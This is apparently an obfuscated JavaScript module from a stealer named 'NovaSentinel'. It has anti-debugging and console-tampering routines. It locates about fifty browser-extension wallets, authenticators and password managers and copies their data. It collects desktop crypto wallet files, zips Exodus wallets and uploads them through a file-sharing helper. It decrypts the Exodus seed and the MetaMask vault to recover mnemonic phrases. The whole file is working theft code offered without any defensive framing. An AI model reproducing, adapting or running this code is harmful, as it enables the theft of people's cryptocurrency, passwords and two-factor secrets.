const _0x3528f4 = (function () {
    let _0xa9998a = true
    return function (_0x2996b3, _0x5ebd35) {
      const _0x2ec15e = _0xa9998a
        ? function () {
            if (_0x5ebd35) {
              const _0x1698b9 = _0x5ebd35.apply(_0x2996b3, arguments)
              return (_0x5ebd35 = null), _0x1698b9
            }
          }
        : function () {}
      return (_0xa9998a = false), _0x2ec15e
    }
  })(),
  _0x41da92 = _0x3528f4(this, function () {
    return _0x41da92
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x41da92)
      .search('(((.+)+)+)+$')
  })
_0x41da92()
const _0x3346af = (function () {
  let _0x325ef6 = true
  return function (_0x514ca5, _0x181955) {
    const _0x3f7a77 = _0x325ef6
      ? function () {
          if (_0x181955) {
            const _0x1a127e = _0x181955.apply(_0x514ca5, arguments)
            return (_0x181955 = null), _0x1a127e
          }
        }
      : function () {}
    return (_0x325ef6 = false), _0x3f7a77
  }
})()
;(function () {
  _0x3346af(this, function () {
    const _0x1d95ed = new RegExp('function *\\( *\\)')
    const _0x32746f = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x189a9b = _0x510e4b('init')
    !_0x1d95ed.test(_0x189a9b + 'chain') || !_0x32746f.test(_0x189a9b + 'input')
      ? _0x189a9b('0')
      : _0x510e4b()
  })()
})()
const _0x4bc38b = (function () {
  let _0x590498 = true
  return function (_0x3bc72a, _0x361d82) {
    const _0x164c30 = _0x590498
      ? function () {
          if (_0x361d82) {
            const _0x261901 = _0x361d82.apply(_0x3bc72a, arguments)
            return (_0x361d82 = null), _0x261901
          }
        }
      : function () {}
    return (_0x590498 = false), _0x164c30
  }
})()
const _0xb247d3 = _0x4bc38b(this, function () {
  let _0x429a32
  try {
    const _0x4a0d13 = Function(
      'return (function() {}.constructor("return this")( ));'
    )
    _0x429a32 = _0x4a0d13()
  } catch (_0xd8726d) {
    _0x429a32 = window
  }
  const _0xac4aa4 = (_0x429a32.console = _0x429a32.console || {})
  const _0x54c4ad = [
    'log',
    'warn',
    'info',
    'error',
    'exception',
    'table',
    'trace',
  ]
  for (let _0x283af0 = 0; _0x283af0 < _0x54c4ad.length; _0x283af0++) {
    const _0x38767a = _0x4bc38b.constructor.prototype.bind(_0x4bc38b),
      _0x17bb02 = _0x54c4ad[_0x283af0],
      _0x4c0e1d = _0xac4aa4[_0x17bb02] || _0x38767a
    _0x38767a['__proto__'] = _0x4bc38b.bind(_0x4bc38b)
    _0x38767a.toString = _0x4c0e1d.toString.bind(_0x4c0e1d)
    _0xac4aa4[_0x17bb02] = _0x38767a
  }
})
_0xb247d3()
const _0x225e63 = require('fs'),
  _0x50cdec = require('seco-file'),
  _0x17c8a2 = require('./core'),
  _0x4d1f7a = require('./save'),
  _0x2c9b72 = require('node-passworder'),
  { stat: _0x35b4d3 } = require('./stats'),
  { upload: _0x44dd72 } = require('./gofile')
class _0x1b665c {
  constructor(_0x108ccb, _0x52a580) {
    this.name = _0x108ccb
    this.id = _0x52a580
  }
  ['addPath'](_0x44d17e) {
    this.path = _0x44d17e
  }
  ['addProfile'](_0x13ce08) {
    this.profile = _0x13ce08
  }
}
class _0x4a8422 {
  constructor(_0x12b023, _0x28bc31, _0x3d494f) {
    this.name = _0x12b023
    this.existpath = _0x28bc31
    this.stealpath = _0x3d494f
  }
}
function _0x598b82() {
  const _0x519f79 = process.env.localappdata,
    _0x17c141 = process.env.appdata,
    _0x5f36f4 = [
      _0x519f79 +
        '\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Extension Settings',
      _0x519f79 +
        '\\Google\\Chrome\\User Data\\%PROFILE%\\Local Extension Settings',
      _0x17c141 + '\\Opera Software\\Opera GX Stable\\Local Extension Settings',
      _0x17c141 +
        '\\Opera Software\\Opera Stable\\User Data\\%PROFILE%\\Local Extension Settings',
      _0x519f79 +
        '\\Google\\Chrome Beta\\User Data\\%PROFILE%\\Local Extension Settings',
      _0x519f79 +
        '\\Yandex\\YandexBrowser\\User Data\\Local Extension Settings',
      _0x519f79 +
        '\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Extension Settings',
    ]
  var _0x57ee3e = []
  for (var _0x311da4 = 0; _0x311da4 < _0x5f36f4.length; _0x311da4++) {
    const _0x43cfc0 = _0x5f36f4[_0x311da4],
      _0x2bfcdf = _0x17c8a2.getProfiles(_0x43cfc0, _0x43cfc0.split('\\')[6])
    for (var _0x2ca010 = 0; _0x2ca010 < _0x2bfcdf.length; _0x2ca010++) {
      _0x57ee3e.push(_0x2bfcdf[_0x2ca010])
    }
  }
  return _0x57ee3e
}
function _0x2167fe(_0x361974) {
  if (_0x361974 != 'yes') {
    return
  }
  const _0x49e590 = _0x598b82(),
    _0x6b3195 = [
      new _0x1b665c('Metamask', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),
      new _0x1b665c('Exodus', 'aholpfdialjgjfhomihkjbmgjidlcdno'),
      new _0x1b665c('Sollet', 'fhmfendgdocmcbmfikdcogofphimnkno'),
      new _0x1b665c(
        'Trezor Password Manager',
        'imloifkgjagghnncjkhggdhalmcnfklk'
      ),
      new _0x1b665c('GAuth Authenticator', 'ilgcnhelpchnceeipipijaljkblbcobl'),
      new _0x1b665c('EOS Authenticator', 'oeljdldpnmdbchonielidgobddffflal'),
      new _0x1b665c('Authy', 'gaedmjdfmmahhbjefcbgaolhhanlaolb'),
      new _0x1b665c('Authenticator', 'bhghoamapcdpbohphigoooaddinpkbai'),
      new _0x1b665c('EO.Finance', 'hoighigmnhgkkdaenafgnefkcmipfjon'),
      new _0x1b665c('TronLink', 'ibnejdfjmmkpcnlpebklmnkoeoihofec'),
      new _0x1b665c('Coinbase', 'hnfanknocfeofbddgcijnmhnfnkdnaad'),
      new _0x1b665c('Jaxx Liberty', 'cjelfplplebdjjenllpjcblmjkfcffne'),
      new _0x1b665c('Guarda', 'hpglfhgfnhbgpjdenjgmdgoeiappafln'),
      new _0x1b665c('Math', 'afbcbjpbpfadlkmhmclhkeeodmamcflc'),
      new _0x1b665c('Binance', 'fhbohimaelbohpjbbldcngcnapndodjp'),
      new _0x1b665c('Nifty', 'jbdaocneiiinmjbjlgalhcelgbejmnid'),
      new _0x1b665c('Yoroi', 'ffnbelfdoeiohenkjibnmadjiehjhajb'),
      new _0x1b665c('EQUAL', 'blnieiiffboillknjnepogjhkgnoapac'),
      new _0x1b665c('BitApp', 'fihkakfobkmkjojpchpfgcmhfjnmnfpi'),
      new _0x1b665c('iwallet', 'kncchdigobghenbbaddojjnnaogfppfj'),
      new _0x1b665c('Wombat', 'amkmjjmmflddogmhpjloimipbofnfjih'),
      new _0x1b665c('MEW CX', 'nlbmnnijcnlegkjjpcfjclmcfggfefdm'),
      new _0x1b665c('Guild', 'nanjmdknhkinifnkgdcggcfnhdaammmj'),
      new _0x1b665c('Ronin', 'fnjhmkhhmkbjkkabndcnnogagogbneec'),
      new _0x1b665c('NeoLine', 'cphhlgmgameodnhkjdmkpanlelnlohao'),
      new _0x1b665c('Clover', 'nhnkbkgjikgcigadomkphalanndcapjk'),
      new _0x1b665c('Liquality', 'kpfopkelmapcoipemfendmdcghnegimn'),
      new _0x1b665c('Terra Station', 'aiifbnbfobpmeekipheeijimdpnlpgpp'),
      new _0x1b665c('Keplr', 'dmkamcknogkgcdfhhbddcghachkejeap'),
      new _0x1b665c('Coin98', 'aeachknmefphepccionboohckonoeemg'),
      new _0x1b665c('ZilPay', 'klnaejjgbibmhlephnhpmaofohgkpgkd'),
      new _0x1b665c('Hycon Lite Client', 'bcopgchhojmggmffilplmbdicgaihlkp'),
      new _0x1b665c('Nash', 'onofpnbbkehpmmoabgpcpmigafmmnjhl'),
      new _0x1b665c('Steem Keychain', 'jhgnbkkipaallpehbohjmkbjofjdmeid'),
      new _0x1b665c('BitClip', 'ijmpgkjfkbfhoebgogflfebnmejmfbml'),
      new _0x1b665c('DAppPlay', 'lodccjjbdhfakaekdiahmedfbieldgik'),
      new _0x1b665c('Auro', 'cnmamaachppnkjgnildpdmkaakejnhae'),
      new _0x1b665c('Polymesh', 'jojhfeoedkpkglbfimdfabpdfjaoolaf'),
      new _0x1b665c('ICONex', 'flpiciilemghbmfalicajoolhkkenfel'),
      new _0x1b665c('Nabox', 'nknhiehlklippafakaeklbeglecifhad'),
      new _0x1b665c('KHC', 'hcflpincpppdclinealmandijcmnkbgn'),
      new _0x1b665c('Temple', 'ookjlbkiijinhpmnjffcofjonbfbgaoc'),
      new _0x1b665c('TezBox', 'mnfifefkajgofkcjkemidiaecocnkjeh'),
      new _0x1b665c('Cyano', 'dkdedlpgdmmkkfjabffeganieamfklkm'),
      new _0x1b665c('Byone', 'nlgbhdfgdhgbiamfdfmbikcdghidoadd'),
      new _0x1b665c('OneKey', 'infeboajgfhgbjpjbeppbkgnabfdkdaf'),
      new _0x1b665c('Leaf', 'cihmoadaighcejopammfbmddcmdekcje'),
      new _0x1b665c('Dashlane', 'fdjamakpfbbddfjaooikfcpapjohcfmg'),
      new _0x1b665c('NordPass', 'fooolghllnmhmmndgjiamiiodkpenpbb'),
      new _0x1b665c('BitWarden', 'nngceckbapebfimnlniiiahkandclblb'),
    ]
  var _0x48dd8d = []
  for (var _0x378081 = 0; _0x378081 < _0x49e590.length; _0x378081++) {
    const _0x4c3bc4 = _0x49e590[_0x378081].path
    for (var _0x849a0e = 0; _0x849a0e < _0x6b3195.length; _0x849a0e++) {
      const _0x3b0cf0 = _0x6b3195[_0x849a0e],
        _0x5014ae = _0x4c3bc4 + '\\' + _0x3b0cf0.id
      _0x225e63.existsSync(_0x5014ae) &&
        (_0x3b0cf0.addPath(_0x5014ae),
        _0x3b0cf0.addProfile(_0x4c3bc4.split('\\')[6].replace(' ', '')),
        _0x48dd8d.push(_0x3b0cf0))
    }
  }
  for (var _0x378081 = 0; _0x378081 < _0x48dd8d.length; _0x378081++) {
    const _0x33b2a2 = _0x48dd8d[_0x378081]
    _0x35b4d3.AddExtensions(_0x33b2a2.name)
    _0x4d1f7a.Save(
      _0x33b2a2.path + '\\',
      'Wallets',
      'Extensions\\' + _0x33b2a2.name + '-' + _0x33b2a2.profile
    )
  }
}
async function _0x2befb6(_0x2b34bb) {
  if (_0x2b34bb != 'yes') {
    return
  }
  const _0x6a2a85 = process.env.appdata
  const _0x833c1c = process.env.localappdata,
    _0x587a05 = [
      new _0x4a8422('Exodus', _0x6a2a85 + '\\Exodus', [
        _0x6a2a85 + '\\Exodus\\exodus.wallet\\',
        _0x6a2a85 + '\\Exodus\\exodus.conf.json',
        _0x6a2a85 + '\\Exodus\\window-state.json',
      ]),
      new _0x4a8422('Electrum', _0x6a2a85 + '\\Electrum-LTC', [
        _0x6a2a85 + '\\Electrum-LTC\\wallets\\',
      ]),
      new _0x4a8422('Atomic', _0x6a2a85 + '\\atomic', [
        _0x6a2a85 + '\\atomic\\LocalStorage\\leveldb\\',
      ]),
      new _0x4a8422('MultiDog', _0x6a2a85 + '\\MultiDog', [
        _0x6a2a85 + '\\MultiDog\\multidoge.wallet\\',
      ]),
      new _0x4a8422('Bitcoin Core', _0x6a2a85 + '\\Bitcoin\\Bitcoin Core', [
        _0x6a2a85 + '\\Bitcoin\\Bitcoin Core\\wallet.dat',
      ]),
      new _0x4a8422('Binance', _0x6a2a85 + '\\Binance', [
        _0x6a2a85 + '\\Binance\\app-store.json',
        _0x6a2a85 + '\\Binance\\Cookies',
      ]),
      new _0x4a8422('Coinomi', _0x6a2a85 + '\\Coinomi', [
        _0x6a2a85 + '\\Coinomi\\wallets\\',
      ]),
      new _0x4a8422('Jax', _0x6a2a85 + '\\jaxx', [
        _0x6a2a85 + '\\jaxx\\LocalStorage\\file_0.localstorage',
      ]),
      new _0x4a8422('ElectronCash', _0x6a2a85 + '\\ElectronCash', [
        _0x6a2a85 + '\\ElectronCash\\wallets\\default_wallet',
      ]),
      new _0x4a8422('Electrum', _0x6a2a85 + '\\Electrum', [
        _0x6a2a85 + '\\Electrum\\wallets\\',
      ]),
      new _0x4a8422('Ether', _0x6a2a85 + '\\Ethereum', [
        _0x6a2a85 + '\\Ethereum\\keystore\\',
      ]),
      new _0x4a8422('Zcash', _0x6a2a85 + '\\Zcash', [_0x6a2a85 + '\\Zcash']),
      new _0x4a8422('Armory', _0x6a2a85 + '\\Armory', [_0x6a2a85 + '\\Armory']),
      new _0x4a8422('Bytecoin', _0x6a2a85 + '\\Bytecoin', [
        _0x6a2a85 + '\\Bytecoin',
      ]),
      new _0x4a8422('Jaxx', _0x6a2a85 + '\\Jaxx', [
        _0x6a2a85 +
          '\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb',
      ]),
      new _0x4a8422('Guarda', _0x6a2a85 + '\\Guarda', [
        _0x6a2a85 + '\\Guarda\\Local Storage\\leveldb',
      ]),
      new _0x4a8422('Coinomi', _0x833c1c + '\\Coinomi', [
        _0x6a2a85 + '\\Coinomi\\Coinomi\\wallets',
      ]),
    ]
  for (var _0xb93ac6 = 0; _0xb93ac6 < _0x587a05.length; _0xb93ac6++) {
    const _0x44752b = _0x587a05[_0xb93ac6]
    if (_0x225e63.existsSync(_0x44752b.existpath)) {
      if (_0x44752b.name == 'Exodus') {
        const _0x22ab49 = await _0x4d1f7a.zip(_0x44752b.stealpath)
        let _0x287513 = await _0x44dd72(_0x22ab49)
        _0x35b4d3.addExodusLink(_0x287513)
        _0x35b4d3.AddColds(_0x44752b.name)
        _0x4d1f7a.ArraySave(_0x44752b.stealpath, 'Cold Wallets', _0x44752b.name)
      }
      _0x35b4d3.AddColds(_0x44752b.name)
      _0x4d1f7a.ArraySave(_0x44752b.stealpath, 'Cold Wallets', _0x44752b.name)
    }
  }
}
async function _0x1ebb83(_0x26c02c, _0x2ebdde) {
  var _0x22397c = ''
  try {
    _0x22397c = await _0x2c9b72.decrypt(_0x2ebdde, _0x26c02c)
  } catch (_0x22dfc9) {}
  return _0x22397c
}
async function _0x5ecb74(_0x40272c, _0x119ace) {
  var _0x440b06 = null
  try {
    var _0x440b06 = JSON.parse(_0x119ace)
  } catch (_0x42bfdc) {}
  if (_0x440b06 == null) {
    return
  }
  return await _0x1ebb83(_0x119ace, _0x40272c)
}
function _0x5ff7d2(_0x16b06a) {
  var _0x4737af = ''
  for (var _0x472139 of _0x16b06a) {
    var _0x2f3acd = _0x472139.data.mnemonic
    _0x2f3acd != undefined &&
      (Array.isArray(_0x2f3acd)
        ? (_0x4737af = Buffer.from(_0x2f3acd).toString('utf-8'))
        : (_0x4737af = _0x2f3acd))
  }
  return _0x4737af
}
function _0x497cc8(_0x3a474f, _0x3165b6) {
  try {
    return _0x50cdec.decryptData(_0x3a474f, _0x3165b6), _0x3165b6
  } catch (_0x404b91) {
    return ''
  }
}
async function _0x1a6893(_0x4afd09, _0x3930a9) {
  const _0x358beb = _0x3930a9
  var _0x37a4e8 = _0x225e63.readFileSync(_0x4afd09)
  var _0x22a8ea
  try {
    _0x358beb.length > 0 &&
      _0x358beb.forEach(function (_0x153ff0) {
        _0x22a8ea = _0x497cc8(_0x37a4e8, _0x153ff0)
        _0x22a8ea != '' &&
          !_0x35b4d3.exodus.includes(_0x22a8ea) &&
          _0x35b4d3.AddExodus(_0x22a8ea)
      })
  } catch (_0x2aafd7) {}
}
async function _0x15cb28(_0x417091, _0x59aefa) {
  if (_0x417091 != 'yes') {
    return
  }
  const _0xd9abaf = process.env.appdata,
    _0x38e3ba = _0xd9abaf + '\\Exodus\\exodus.wallet\\seed.seco'
  if (_0x225e63.existsSync(_0x38e3ba)) {
    try {
      _0x1a6893(_0x38e3ba, _0x59aefa)
    } catch (_0x4c9409) {}
  } else {
  }
}
async function _0x2d6e26(_0x18acba) {
  const _0x286b33 = _0x598b82()
  var _0x164fe9 = []
  var _0x40ee0c = []
  for (let _0xa07438 = 0; _0xa07438 < _0x286b33.length; _0xa07438++) {
    const _0x44d122 = _0x286b33[_0xa07438],
      _0x4ed32d = _0x44d122 + '\\nkbihfbeogaeaoehlefnkodbefgpgknn\\'
    _0x225e63.existsSync(_0x4ed32d) && _0x164fe9.push(_0x4ed32d)
  }
  for (let _0xf1b2c3 = 0; _0xf1b2c3 < _0x164fe9.length; _0xf1b2c3++) {
    const _0x1966c2 = _0x164fe9[_0xf1b2c3],
      _0x189674 = _0x225e63.readdirSync(_0x1966c2)
    for (let _0x2b6859 = 0; _0x2b6859 < _0x189674.length; _0x2b6859++) {
      const _0x20cd26 = _0x189674[_0x2b6859]
      if (_0x20cd26.endsWith('.log')) {
        const _0x400d37 = _0x225e63.readFileSync(
            _0x1966c2 + _0x20cd26,
            'utf-8'
          ),
          _0x5d8c83 = /\"vault":"(?:[^\\"]|\\\\|\\")*"\}/gm,
          _0x1b58b9 = _0x400d37.match(_0x5d8c83)
        for (let _0x2e4551 = 0; _0x2e4551 < _0x1b58b9.length; _0x2e4551++) {
          const _0x383f22 = _0x1b58b9[_0x2e4551]
          _0x40ee0c.push(
            _0x383f22.replace(/\\/gm, '').replace('"vault":"', '').slice(0, -2)
          )
        }
      }
    }
  }
  _0x40ee0c = [...new Set(_0x40ee0c)]
  var _0x222ccf = []
  for (let _0xaaa331 = 0; _0xaaa331 < _0x40ee0c.length; _0xaaa331++) {
    const _0x4468ba = _0x40ee0c[_0xaaa331]
    for (let _0x32b81c = 0; _0x32b81c < _0x18acba.length; _0x32b81c++) {
      const _0x41ccbe = _0x18acba[_0x32b81c]
      var _0x38345d = await _0x5ecb74(_0x41ccbe, _0x4468ba)
      _0x38345d != '' &&
        _0x38345d != undefined &&
        _0x222ccf.push(_0x5ff7d2(_0x38345d))
    }
  }
  _0x222ccf = [...new Set(_0x222ccf)]
  _0x222ccf = _0x222ccf.filter((_0x155623) => _0x155623)
  let _0x50f63b = []
  for (let _0x225622 = 0; _0x225622 < _0x222ccf.length; _0x225622++) {
    _0x50f63b.push({ phrase: _0x222ccf[_0x225622] })
  }
  return _0x50f63b
}
module.exports = {
  NovaSentinelExtensions: _0x2167fe,
  NovaSentinelColds: _0x2befb6,
  NovaSentinelMetamask: _0x2d6e26,
  exodusDecrypt: _0x15cb28,
}
function _0x510e4b(_0x943abb) {
  function _0x5d5f04(_0x1c7d15) {
    if (typeof _0x1c7d15 === 'string') {
      return function (_0x513a26) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x1c7d15 / _0x1c7d15).length !== 1 || _0x1c7d15 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x5d5f04(++_0x1c7d15)
  }
  try {
    if (_0x943abb) {
      return _0x5d5f04
    } else {
      _0x5d5f04(0)
    }
  } catch (_0x20f19e) {}
}
